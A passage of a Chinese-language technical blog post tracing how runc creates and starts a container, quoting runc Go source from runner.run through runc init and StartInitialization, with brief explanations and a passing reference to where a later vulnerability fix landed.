cm,</span><br><span class="line">        intelRdtManager: intelrdt.NewManager(config, id, <span class="string">&quot;&quot;</span>),</span><br><span class="line">    &#125;</span><br><span class="line">    c.state = &amp;stoppedState&#123;c: c&#125;</span><br><span class="line">    <span class="keyword">return</span> c, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建容器过程到此结束，下面是一步步返回到startContainer中，通过包含container对象的runner对象，调用r.run启动容器</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">     r := &amp;runner&#123;</span><br><span class="line">    enableSubreaper: !context.Bool(<span class="string">&quot;no-subreaper&quot;</span>),</span><br><span class="line">    shouldDestroy:   !context.Bool(<span class="string">&quot;keep&quot;</span>),</span><br><span class="line">    container:       container,</span><br><span class="line">    listenFDs:       listenFDs,</span><br><span class="line">    notifySocket:    notifySocket,</span><br><span class="line">    consoleSocket:   context.String(<span class="string">&quot;console-socket&quot;</span>),</span><br><span class="line">    detach:          context.Bool(<span class="string">&quot;detach&quot;</span>),</span><br><span class="line">    pidFile:         context.String(<span class="string">&quot;pid-file&quot;</span>),</span><br><span class="line">    preserveFDs:     context.Int(<span class="string">&quot;preserve-fds&quot;</span>),</span><br><span class="line">    action:          action,</span><br><span class="line">    criuOpts:        criuOpts,</span><br><span class="line">    init:            <span class="literal">true</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> r.run(spec.Process)</span><br></pre></td></tr></table></figure>

<h2 id="runner-run"><a href="#runner-run" class="headerlink" title="runner.run"></a>runner.run</h2><p><a target="_blank" rel="noopener" href="https://github.com/opencontainers/runc/blob/99968fc0874642300f688ce4d617a1e42ca7ce29/utils_linux.go#L203">https://github.com/opencontainers/runc/blob/99968fc0874642300f688ce4d617a1e42ca7ce29/utils_linux.go#L203</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *runner)</span></span> run(config *specs.Process) (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            r.destroy()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">if</span> err = r.checkTerminal(config); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    process, err := newProcess(*config)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    process.LogLevel = strconv.Itoa(<span class="type">int</span>(logrus.GetLevel()))</span><br><span class="line">    <span class="comment">// Populate the fields that come from runner.</span></span><br><span class="line">    process.Init = r.init</span><br><span class="line">    process.SubCgroupPaths = r.subCgroupPaths</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(r.listenFDs) &gt; <span class="number">0</span> &#123;</span><br><span class="line">        process.Env = <span class="built_in">append</span>(process.Env, <span class="string">&quot;LISTEN_FDS=&quot;</span>+strconv.Itoa(<span class="built_in">len</span>(r.listenFDs)), <span class="string">&quot;LISTEN_PID=1&quot;</span>)</span><br><span class="line">        process.ExtraFiles = <span class="built_in">append</span>(process.ExtraFiles, r.listenFDs...)</span><br><span class="line">    &#125;</span><br><span class="line">    baseFd := <span class="number">3</span> + <span class="built_in">len</span>(process.ExtraFiles)</span><br><span class="line">    <span class="keyword">for</span> i := baseFd; i &lt; baseFd+r.preserveFDs; i++ &#123;</span><br><span class="line">        _, err = os.Stat(<span class="string">&quot;/proc/self/fd/&quot;</span> + strconv.Itoa(i))</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>, fmt.Errorf(<span class="string">&quot;unable to stat preserved-fd %d (of %d): %w&quot;</span>, i-baseFd, r.preserveFDs, err)</span><br><span class="line">        &#125;</span><br><span class="line">        process.ExtraFiles = <span class="built_in">append</span>(process.ExtraFiles, os.NewFile(<span class="type">uintptr</span>(i), <span class="string">&quot;PreserveFD:&quot;</span>+strconv.Itoa(i)))</span><br><span class="line">    &#125;</span><br><span class="line">    rootuid, err := r.container.Config().HostRootUID()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    rootgid, err := r.container.Config().HostRootGID()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    detach := r.detach || (r.action == CT_ACT_CREATE)</span><br><span class="line">    <span class="comment">// Setting up IO is a two stage process. We need to modify process to deal</span></span><br><span class="line">    <span class="comment">// with detaching containers, and then we get a tty after the container has</span></span><br><span class="line">    <span class="comment">// started.</span></span><br><span class="line">    handler := newSignalHandler(r.enableSubreaper, r.notifySocket)</span><br><span class="line">    tty, err := setupIO(process, rootuid, rootgid, config.Terminal, detach, r.consoleSocket)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> tty.Close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> r.action &#123;</span><br><span class="line">    <span class="keyword">case</span> CT_ACT_CREATE:</span><br><span class="line">        err = r.container.Start(process)</span><br><span class="line">    <span class="keyword">case</span> CT_ACT_RESTORE:</span><br><span class="line">        err = r.container.Restore(process, r.criuOpts)</span><br><span class="line">    <span class="keyword">case</span> CT_ACT_RUN:</span><br><span class="line">        err = r.container.Run(process)</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;Unknown action&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err = tty.waitConsole(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        r.terminate(process)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    tty.ClosePostStart()</span><br><span class="line">    <span class="keyword">if</span> r.pidFile != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err = createPidFile(r.pidFile, process); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            r.terminate(process)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    status, err := handler.forward(process, tty, detach)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        r.terminate(process)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> detach &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">        r.destroy()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> status, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在startContainer中设置了标志CT_ACT_RUN，所以在这里调用r.container.Run(process)</p>
<p>在libcontainer.Create中设置了container</p>
<h2 id="Container-Run"><a href="#Container-Run" class="headerlink" title="Container.Run"></a>Container.Run</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run immediately starts the process inside the container. Returns an error if</span></span><br><span class="line"><span class="comment">// the process fails to start. It does not block waiting for the exec fifo</span></span><br><span class="line"><span class="comment">// after start returns but opens the fifo after start returns.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Container)</span></span> Run(process *Process) <span class="type">error</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> err := c.Start(process); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> process.Init &#123;</span><br><span class="line">        <span class="keyword">return</span> c.exec()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过libContainer.Container.Start启动一个子进程，然后调用c.exec</p>
<h2 id="Container-Start"><a href="#Container-Start" class="headerlink" title="Container.Start"></a>Container.Start</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Start starts a process inside the container. Returns error if process fails</span></span><br><span class="line"><span class="comment">// to start. You can track process lifecycle with passed Process structure.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Container)</span></span> Start(process *Process) <span class="type">error</span> &#123;</span><br><span class="line">    c.m.Lock()</span><br><span class="line">    <span class="keyword">defer</span> c.m.Unlock()</span><br><span class="line">    <span class="keyword">if</span> c.config.Cgroups.Resources.SkipDevices &#123;</span><br><span class="line">        <span class="keyword">return</span> errors.New(<span class="string">&quot;can&#x27;t start container with SkipDevices set&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> process.Init &#123;</span><br><span class="line">        <span class="keyword">if</span> err := c.createExecFifo(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err := c.start(process); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> process.Init &#123;</span><br><span class="line">            c.deleteExecFifo()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>委托给Container.start</p>
<h2 id="Container-start"><a href="#Container-start" class="headerlink" title="Container.start"></a>Container.start</h2><p><a target="_blank" rel="noopener" href="https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/container_linux.go#L317-L356">https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/container_linux.go#L317-L356</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Container)</span></span> start(process *Process) (retErr <span class="type">error</span>) &#123;</span><br><span class="line">    parent, err := c.newParentProcess(process)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;unable to create new parent process: %w&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logsDone := parent.forwardChildLogs()</span><br><span class="line">    <span class="keyword">if</span> logsDone != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="comment">// Wait for log forwarder to finish. This depends on</span></span><br><span class="line">            <span class="comment">// runc init closing the _LIBCONTAINER_LOGPIPE log fd.</span></span><br><span class="line">            err := &lt;-logsDone</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; retErr == <span class="literal">nil</span> &#123;</span><br><span class="line">                retErr = fmt.Errorf(<span class="string">&quot;unable to forward init logs: %w&quot;</span>, err)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := parent.start(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;unable to start container process: %w&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> process.Init &#123;</span><br><span class="line">        c.fifo.Close()</span><br><span class="line">        <span class="keyword">if</span> c.config.Hooks != <span class="literal">nil</span> &#123;</span><br><span class="line">            s, err := c.currentOCIState()</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> err</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> err := c.config.Hooks[configs.Poststart].RunHooks(s); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> err := ignoreTerminateErrors(parent.terminate()); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                    logrus.Warn(fmt.Errorf(<span class="string">&quot;error running poststart hook: %w&quot;</span>, err))</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> err</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>start()</code>函数调用<code>newParentProcess()</code>创建父进程对象<code>parent</code>，并调用<code>parent.start()</code>启动子进程。</p>
<h2 id="newParentProcess"><a href="#newParentProcess" class="headerlink" title="newParentProcess"></a>newParentProcess</h2><p><a target="_blank" rel="noopener" href="https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/container_linux.go#L436-L463">https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/container_linux.go#L436-L463</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Container)</span></span> newParentProcess(p *Process) (parentProcess, <span class="type">error</span>) &#123;</span><br><span class="line">    parentInitPipe, childInitPipe, err := utils.NewSockPair(<span class="string">&quot;init&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;unable to create init pipe: %w&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    messageSockPair := filePair&#123;parentInitPipe, childInitPipe&#125;</span><br><span class="line"></span><br><span class="line">    parentLogPipe, childLogPipe, err := os.Pipe()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;unable to create log pipe: %w&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    logFilePair := filePair&#123;parentLogPipe, childLogPipe&#125;</span><br><span class="line"></span><br><span class="line">    cmd := c.commandTemplate(p, childInitPipe, childLogPipe)</span><br><span class="line">    <span class="keyword">if</span> !p.Init &#123;</span><br><span class="line">        <span class="keyword">return</span> c.newSetnsProcess(p, cmd, messageSockPair, logFilePair)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// We only set up fifoFd if we&#x27;re not doing a `runc exec`. The historic</span></span><br><span class="line">    <span class="comment">// reason for this is that previously we would pass a dirfd that allowed</span></span><br><span class="line">    <span class="comment">// for container rootfs escape (and not doing it in `runc exec` avoided</span></span><br><span class="line">    <span class="comment">// that problem), but we no longer do that. However, there&#x27;s no need to do</span></span><br><span class="line">    <span class="comment">// this for `runc exec` so we just keep it this way to be safe.</span></span><br><span class="line">    <span class="keyword">if</span> err := c.includeExecFifo(cmd); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;unable to setup exec fifo: %w&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c.newInitProcess(p, cmd, messageSockPair, logFilePair)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>newParentProcess首先创建了父子进程之间通信的管道，然后调用commandTemplate配置子进程的命令为runc init，并将管道文件传给子进程，让其可以与父进程通信。</p>
<h2 id="parent-start"><a href="#parent-start" class="headerlink" title="parent.start"></a>parent.start</h2><p><a target="_blank" rel="noopener" href="https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/process_linux.go#L356">https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/process_linux.go#L356</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *initProcess)</span></span> start() (retErr <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="keyword">defer</span> p.messageSockPair.parent.Close() <span class="comment">//nolint: errcheck</span></span><br><span class="line">    err := p.cmd.Start() <span class="comment">//runc init</span></span><br><span class="line">    p.process.ops = p</span><br><span class="line">    <span class="comment">//.......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>启动runc init，也就是子进程</p>
</li>
<li><p>获取parentPipe；</p>
</li>
<li><p>调用execSetns()等待进程namespace等信息；</p>
</li>
<li><p>调用Apply()生成cgroup相关文件；</p>
</li>
<li><p>调用createNetworkInterfaces()初始化容器网络；</p>
</li>
<li><p>调用sendConfig()把配置发送给child进程，子进程在获取配置后才会往下执行；</p>
</li>
<li><p>通过pipe和child进程进行交互：<br>当收到child进程的proReady信号，则调用Set()在cgroup中添加资源限制；<br>当收到procHooks时，则执行config.json定义的prestart hooks；<br>当child进程把pipe关闭时，则parent退出交互；</p>
</li>
<li><p>返回，也就意味着<code>runc create</code>进程结束。</p>
</li>
</ol>
<h2 id="p-cmd-Start"><a href="#p-cmd-Start" class="headerlink" title="p.cmd.Start"></a>p.cmd.Start</h2><p>接下来就进入到了<code>runc init</code>的执行过程，这也是实际完成启动容器进程的执行过程。</p>
<p><code>runc init</code>命令对应的函数为init</p>
<p><a target="_blank" rel="noopener" href="https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/init.go">https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/init.go</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime&quot;</span></span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;github.com/opencontainers/runc/libcontainer&quot;</span></span><br><span class="line">    _ <span class="string">&quot;github.com/opencontainers/runc/libcontainer/nsenter&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(os.Args) &gt; <span class="number">1</span> &amp;&amp; os.Args[<span class="number">1</span>] == <span class="string">&quot;init&quot;</span> &#123;</span><br><span class="line">        <span class="comment">// This is the golang entry point for runc init, executed</span></span><br><span class="line">        <span class="comment">// before main() but after libcontainer/nsenter&#x27;s nsexec().</span></span><br><span class="line">        runtime.GOMAXPROCS(<span class="number">1</span>)</span><br><span class="line">        runtime.LockOSThread()</span><br><span class="line"></span><br><span class="line">        level, err := strconv.Atoi(os.Getenv(<span class="string">&quot;_LIBCONTAINER_LOGLEVEL&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="built_in">panic</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        logPipeFd, err := strconv.Atoi(os.Getenv(<span class="string">&quot;_LIBCONTAINER_LOGPIPE&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="built_in">panic</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        logrus.SetLevel(logrus.Level(level))</span><br><span class="line">        logrus.SetOutput(os.NewFile(<span class="type">uintptr</span>(logPipeFd), <span class="string">&quot;logpipe&quot;</span>))</span><br><span class="line">        logrus.SetFormatter(<span class="built_in">new</span>(logrus.JSONFormatter))</span><br><span class="line">        logrus.Debug(<span class="string">&quot;child process in init()&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> err := libcontainer.StartInitialization(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="comment">// as the error is sent back to the parent there is no need to log</span></span><br><span class="line">            <span class="comment">// or write it to stderr because the parent process will handle this</span></span><br><span class="line">            os.Exit(<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;libcontainer: container init failed to exec&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中引入了nsenter包，由于CGO的特新，nsenter中的nsexec函数会首先被执行，它主要完成进入namespace的操作。</p>
<h2 id="nsexec"><a href="#nsexec" class="headerlink" title="nsexec"></a>nsexec</h2><p><a target="_blank" rel="noopener" href="https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/nsenter/nsexec.c#L835">https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/nsenter/nsexec.c#L835</a></p>
<p>这也是之后漏洞修复的位置。</p>
<p>之后执行Init函数中的libcontainer.StartInitialization</p>
<h2 id="StartInitialization"><a href="#StartInitialization" class="headerlink" title="StartInitialization"></a>StartInitialization</h2><p><a target="_blank" rel="noopener" href="https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/factory_linux.go#L159">https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/factory_linux.go#L159</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 